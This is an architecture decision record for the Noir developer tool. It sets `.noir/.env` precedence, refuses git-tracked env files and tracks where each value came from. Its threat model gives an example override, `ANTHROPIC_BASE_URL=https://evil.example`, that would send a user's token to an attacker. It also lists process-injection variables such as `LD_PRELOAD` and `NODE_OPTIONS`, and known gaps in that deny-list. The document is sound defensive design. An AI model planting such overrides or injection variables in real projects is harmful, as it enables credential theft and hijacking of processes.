# ADR-0011 — `.noir/.env` precedence, provenance, and the configuration doctrine

- **Status:** Accepted
- **Date:** 2026-09-11
- **Spec:** `docs/internal/specs/2026-09-11-daemon-hardening-init-completeness-design.md`

## Context

`.noir/.env` was nominally supported and effectively unusable. The loader filled
only *unset* keys, so a token exported from `~/.zshrc` silently shadowed the one
the user had just put in the project file — the maintainer's live failure was
literally "I edited `.noir/.env` and nothing changed". `noir init` never created
the file, so most projects did not have one. The doctrine recorded across the
docs (`environment.md`, `clickup.md`, `privacy.md`, nine skills) named
`~/.claude/settings.json` as the *most reliable* placement, inverting the
project-over-user ranking that Claude Code's own settings model uses. And the
`--upgrade` path had no way to backfill a seed file added after a project was
initialized — proven against a real project, not theorized.

## Decision

**A key `.noir/.env` defines WINS; the real environment is the fallback for the
keys the file omits.** Project scope beats machine scope for project
configuration. This is a deliberate departure from the 12-factor / dotenv / Node
`--env-file` consensus (fill-only-unset): for *ambient* overrides fill-only-unset
is correct, but for a project's own declared configuration it means the project
file can never describe the project. The research grounding is Claude Code's own
settings stack (`.claude/settings.local.json` outranks `~/.claude/settings.json`,
and the user file is documented as carrying "personal preferences" while the
project file carries "the environment variables the project needs") and
1Password's documented `op run` precedence (`env files > shell environment`).

The full chain, highest first:

```
1. run profile env   run.profiles.<n>.env          (per-invocation; merges OVER)
2. .noir/.env        the project's own declared configuration
3. real environment  CI / container / launchd / shell rc
4. built-in default
```

There is deliberately **no one-shot `VAR=value noir …` level**: a prefix arrives
in `process.env` indistinguishably from the inherited environment, so it *is*
level 3, not an override above the file. A genuine per-invocation value is a
`run.profiles.<n>.env` entry.

**`applyNoirEnv` stays confined to Noir's own process tree.** The precedence
change is a *read* ordering, never a write-back: the overlay is applied to Noir's
own environment only, so a user's manual multi-profile `claude` invocations from
the same shell are untouched. `run.profiles.<n>.env` keeps merging **over** the
result — the documented exception survives the inversion.

**A git-tracked `.noir/.env` is refused outright.** Inverting precedence creates
a credential-exfiltration path: a file that arrived with the clone could set
`ANTHROPIC_BASE_URL=https://evil.example` while the user's real token still
arrives through the fallback, and be sent to the attacker with the user never
knowing a file was involved. Tracking status separates "my local file" (untracked
— Noir's managed `.gitignore` block lists `/.noir/.env`) from "a file that came
with the repository", without denying the feature. The refusal is decided
**before** parsing, so a refused file cannot warn about, shadow, or contribute a
single key. Every git failure — no binary, not a repository, a timeout, a
`safe.directory` refusal — degrades to **trusted**: failing closed would let one
exotic setup silently disable a project's own env file for every user, which is a
far worse trade than missing one refusal.

**Provenance is a first-class surface, not a debugging burden.** `loadNoirEnv`
returns a `sources` map (key → `'file' | 'env'`), consumed by `noir env` and by
doctor's provenance rows. The command renders exactly the keys a user can act on
(every key the file defines, plus curated ambient names, plus ambient names the
project's own config references) rather than dumping all of `process.env`. In
addition, the loader emits one stderr warning per key whose file value overrides
an ambient one, so the inversion announces itself on the first command run after
upgrade instead of being discovered.

**No value is ever printed.** `noir env`, the shadowing warning, and the
`noir run` messages all extend the existing names-only contract: key names, the
winning source, and a redacted shape at most. stderr is loggable and shareable.

**`--upgrade` emits every manifest mode, rather than gaining a new "backfill"
mode.** `skipIfExists` already means "create only if absent, never modify", so
running it during `--upgrade` backfills a seed added to the manifest since
initialization while remaining structurally unable to touch a file the user owns.
A fourth mode would add surface without adding safety. `mergeJson` is the one
exclusion: `.claude/settings.local.json` is user-owned and write-once by its own
contract, and its merge re-appends the `SessionStart` hook whenever the dedup
substring is absent — an upgrade emit would resurrect a hook the user
deliberately removed.

**Generated docs are fixed in the generator.** `docs/reference/{config,cli,mcp-tools}.md`
are whole-file emitted by `scripts/docs-generate.mjs`; a `.md`-only edit is
silently reverted on the next `pnpm docs:generate`. The acceptance test for those
pages is regenerate-and-diff, never reading the `.md`. `environment.md` lives in
the same directory and is hand-authored, so it is edited directly.

## Consequences

- **Breaking.** A user with the same key in `.noir/.env` and the environment
  observes a different effective configuration after upgrading. For anyone whose
  project file was being ignored this is the fix; for anyone whose shell export
  was a deliberate override it is a surprise, which is why it is a **Changed**
  entry in the CHANGELOG rather than a silent correction. No automatic migration
  is possible or desirable — Noir cannot know whether a duplicated key is a
  mistake or a deliberate override, and rewriting a user's `.zshrc` or
  `.noir/.env` is out of scope. Detection plus a clear message is the whole
  remedy.
- `noir init` now seeds `.noir/.env` at mode `0600` containing only comments
  (loading it yields an empty overlay, so behaviour is unchanged), and
  `.noir/.env.example` is the committable documentation twin — never loaded.
- `noir init --upgrade` is the recommended post-upgrade step; `noir doctor`'s
  scaffold-drift row prompts it. `CURRENT_SCAFFOLD_VERSION` moves `1.0.0 → 1.1.0`
  with the first real migration entry.
- The process-injection deny-list (`NODE_OPTIONS`, `LD_PRELOAD`, `npm_config_*`,
  `COREPACK_*`, and Noir's own plumbing names) is refused from `.noir/.env` with
  a one-line warning. The alternation is `(?:$|_)`-anchored, so each `NOIR_*`
  name is its own alternative — `NOIR_DAEMON_JSON` does not cover
  `NOIR_DAEMON_DIR`, which is a hijack vector and is listed explicitly.
- Known, deliberately recorded rather than silently dropped: the deny-list match
  is **case-sensitive** while `process.env` on Windows is not, so a
  differently-cased spelling of a denied name can land in the overlay; and the
  `.env` filename refusal is keyed on the literal spelling, which a
  case-insensitive filesystem can collide with. Both are tracked in
  `docs/roadmap/backlog.md`.

## See also

- **ADR-0010 — Per-project daemon records, a real `daemon.port`, and HTTP-only auth.**
- **User-facing how-to:** [`configure-env.md`](../how-to/configure-env.md).
- `docs/reference/environment.md` — the full variable reference + precedence chain.
